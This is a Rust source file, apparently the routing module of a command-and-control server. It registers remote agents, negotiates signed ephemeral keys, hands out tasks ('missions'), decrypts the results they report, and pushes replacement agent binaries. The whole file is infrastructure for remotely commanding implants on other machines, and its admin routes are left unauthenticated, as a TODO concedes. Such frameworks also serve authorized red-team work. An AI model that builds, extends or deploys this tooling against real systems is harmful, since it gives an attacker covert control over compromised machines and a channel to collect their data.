use axum::{
    extract::{Path, State},
    http::StatusCode,
    response::IntoResponse,
    routing::{get, post, put},
    Json, Router,
};
use common::{crypto, model};
use tracing::{debug, error, warn};

use crate::{services, C2State};

// TODO Either encrypt all routes or listen on a different interface for admin routes
// TODO Try to propagate errors using impl IntoResponse for better error handling

pub fn init_router() -> Router<C2State> {
    Router::new()
        .route("/crypto/:mission_id", get(get_crypto))
        .nest(
            "/agents",
            Router::new()
                .route("/", post(agents::create).get(agents::get))
                .nest(
                    "/:agent_id",
                    Router::new()
                        .route("/", put(agents::update))
                        .route("/update", put(agents::update_bin)),
                ),
        )
        .nest(
            "/missions",
            Router::new()
                .route("/", post(missions::create).get(missions::get_next))
                .route(
                    "/:mission_id",
                    get(missions::get_report).put(missions::report),
                ),
        )
}

const AGENT_NOT_FOUND: &str = "Agent not found.";
const MISSION_NOT_FOUND: &str = "Mission not found.";

async fn get_crypto(
    State(mut c2_state): State<C2State>,
    Path(mission_id): Path<i32>,
    crypto_negociation: Json<model::CryptoNegociation>,
) -> impl IntoResponse {
    // Check agent & agent exists
    let agent = match crypto_negociation.verify() {
        Ok(_) => {
            match services::agents::get_by_identity(
                c2_state.conn.clone(),
                crypto_negociation.identity.to_bytes(),
            ) {
                Ok(Some(agent)) => agent,
                Ok(None) => {
                    warn!("Agent not found");
                    return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
                }
                Err(e) => {
                    error!("{e}");
                    return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
                }
            }
        }
        Err(e) => {
            error!("{e}");
            return (StatusCode::UNAUTHORIZED).into_response();
        }
    };

    // Check mission exists
    let mission = match services::missions::get_by_id(c2_state.conn.clone(), mission_id) {
        Ok(Some(m)) => m,
        Ok(None) => {
            warn!("Mission not found");
            return (StatusCode::NOT_FOUND, MISSION_NOT_FOUND).into_response();
        }
        Err(e) => {
            error!("{e}");
            return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
        }
    };

    // Check mission is not completed and is for the agent
    if mission.completed_at.is_some() || mission.agent_id != agent.id {
        warn!(
            "Mission [{}] is completed or not affected to agent [{}]",
            mission_id, agent.id
        );
        return (StatusCode::BAD_REQUEST).into_response();
    }

    let (private_key, crypto_negociation) =
        model::CryptoNegociation::new(&mut c2_state.signing_key);
    c2_state
        .ephemeral_private_keys
        .lock()
        .unwrap()
        .entry(mission.id)
        .or_insert(private_key);

    (StatusCode::OK, Json(Some(crypto_negociation))).into_response()
}

mod agents {
    use axum::{body::Bytes, extract::Path};
    use tracing::error;

    use super::*;

    pub async fn create(
        State(c2_state): State<C2State>,
        Json(agent): Json<model::Agent>,
    ) -> impl IntoResponse {
        if let Ok(agent) = services::agents::create(
            c2_state.conn.clone(),
            &agent.name,
            agent.identity,
            agent.platform,
        ) {
            (StatusCode::CREATED, Json(agent)).into_response()
        } else {
            (StatusCode::INTERNAL_SERVER_ERROR).into_response()
        }
    }

    pub async fn get(State(c2_state): State<C2State>) -> impl IntoResponse {
        if let Ok(agents) = services::agents::get(c2_state.conn.clone()) {
            (StatusCode::OK, Json(agents)).into_response()
        } else {
            (StatusCode::INTERNAL_SERVER_ERROR).into_response()
        }
    }

    // #[axum::debug_handler]
    pub async fn update_bin(
        State(c2_state): State<C2State>,
        Path(agent_id): Path<i32>,
        _bin: Bytes,
    ) -> impl IntoResponse {
        match services::agents::get_by_id(c2_state.conn.clone(), agent_id) {
            Ok(Some(_)) => {}
            Ok(None) => {
                warn!("Agent not found");
                return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
            }
            Err(e) => {
                error!("{e}");
                return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
            }
        };
        if let Err(e) =
            services::missions::create(c2_state.conn.clone(), agent_id, model::Task::Update(vec![]))
        {
            error!("{e}");
            return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
        }
        (StatusCode::OK).into_response()
    }

    pub async fn update(
        State(c2_state): State<C2State>,
        Path(agent_id): Path<i32>,
        agent_json: String,
    ) -> impl IntoResponse {
        let agent_json: serde_json::Value = serde_json::from_str(&agent_json).unwrap();
        match services::agents::get_by_id(c2_state.conn.clone(), agent_id) {
            Ok(Some(agent)) => {
                match services::agents::update_by_id(
                    c2_state.conn.clone(),
                    &agent.merge(agent_json),
                ) {
                    Ok(agent) => (StatusCode::OK, Json(Some(agent))).into_response(),
                    Err(e) => {
                        error!("{e}");
                        (StatusCode::INTERNAL_SERVER_ERROR).into_response()
                    }
                }
            }
            Ok(None) => (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response(),
            Err(e) => {
                error!("{e}");
                (StatusCode::INTERNAL_SERVER_ERROR).into_response()
            }
        }
    }
}

mod missions {
    use axum::extract::Path;
    use common::model::Mission;
    use tracing::error;

    use super::*;

    pub async fn create(State(c2_state): State<C2State>, body: Json<Mission>) -> impl IntoResponse {
        debug!("{body:#?}");
        if let Ok(mission) =
            services::missions::create(c2_state.conn.clone(), body.agent_id, body.task.clone())
        {
            (StatusCode::CREATED, Json(mission)).into_response()
        } else {
            (StatusCode::INTERNAL_SERVER_ERROR).into_response()
        }
    }

    pub async fn get_next(
        State(mut c2_state): State<C2State>,
        // headers: HeaderMap,
        crypto_negociation: Json<model::CryptoNegociation>,
    ) -> impl IntoResponse {
        if let Err(e) = crypto_negociation.verify() {
            error!("{e}");
            return (StatusCode::UNAUTHORIZED).into_response();
        }

        let agent = match services::agents::get_by_identity(
            c2_state.conn.clone(),
            crypto_negociation.identity.to_bytes(),
        ) {
            Ok(Some(agent)) => agent,
            Ok(None) => {
                warn!("Agent not found");
                return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
            }
            Err(e) => {
                error!("{e}");
                return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
            }
        };

        let mission = match services::missions::poll_next(c2_state.conn.clone(), agent.id).await {
            Ok(Some(m)) => m,
            Ok(None) => {
                debug!("No mission for agent {}", agent.id);
                return (StatusCode::NO_CONTENT).into_response();
            }
            Err(e) => {
                error!("{e}");
                return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
            }
        };

        // TODO Create a proper to store & deliver agent versions
        let mission = if let model::Mission {
            task: model::Task::Update(_),
            ..
        } = mission
        {
            // let agent_bin =
            //     std::fs::read("target/x86_64-pc-windows-gnu/release/agent.exe").unwrap();
            let agent_bin = std::fs::read("target/release/agent").unwrap();
            model::Mission {
                task: model::Task::Update(agent_bin),
                ..mission
            }
        } else {
            mission
        };
        //
        debug!("{mission}");
        let mission = serde_json::to_vec(&mission).unwrap();

        (
            StatusCode::OK,
            Json(Some(
                model::CryptoMessage::new(
                    &mut c2_state.signing_key,
                    crypto_negociation.public_key,
                    &mission,
                )
                .unwrap(),
            )),
        )
            .into_response()
    }

    pub async fn get_report(
        State(c2_state): State<C2State>,
        Path(mission_id): Path<i32>,
    ) -> impl IntoResponse {
        let mission = match services::missions::get_by_id(c2_state.conn.clone(), mission_id) {
            Ok(Some(m)) => m,
            Ok(None) => {
                return (StatusCode::NOT_FOUND, MISSION_NOT_FOUND).into_response();
            }
            Err(e) => {
                error!("{e}");
                return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
            }
        };

        if mission.completed_at.is_some() {
            (StatusCode::OK, Json(mission.result)).into_response()
        } else {
            (StatusCode::NO_CONTENT).into_response()
        }
    }

    pub async fn report(
        State(c2_state): State<C2State>,
        Path(mission_id): Path<i32>,
        crypto_message: Json<model::CryptoMessage>,
    ) -> impl IntoResponse {
        let mission = match services::missions::get_by_id(c2_state.conn.clone(), mission_id) {
            Ok(Some(m)) => m,
            Ok(None) => {
                return (StatusCode::NOT_FOUND, MISSION_NOT_FOUND).into_response();
            }
            Err(e) => {
                error!("{e}");
                return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
            }
        };

        let agent = match services::agents::get_by_id(c2_state.conn.clone(), mission.agent_id) {
            Ok(Some(agent)) => agent,
            Ok(None) => {
                return (StatusCode::NOT_FOUND, AGENT_NOT_FOUND).into_response();
            }
            Err(e) => {
                error!("{e}");
                return (StatusCode::INTERNAL_SERVER_ERROR).into_response();
            }
        };

        if let Err(e) =
            crypto_message.verify(&crypto::VerifyingKey::from_bytes(&agent.identity).unwrap())
        {
            error!("{e}");
            return (StatusCode::UNAUTHORIZED).into_response();
        }

        let Some(private_key) = c2_state
            .ephemeral_private_keys
            .lock()
            .unwrap()
            .remove(&mission_id)
        else {
            warn!("No ephemeral private key for mission {}", mission_id);
            return (StatusCode::UNAUTHORIZED).into_response();
        };
        let decrypted_data = crypto_message.decrypt(private_key).unwrap();

        let result = String::from_utf8(decrypted_data).unwrap();
        services::missions::complete(c2_state.conn.clone(), mission_id, &result).unwrap();

        (StatusCode::ACCEPTED).into_response()
    }
}
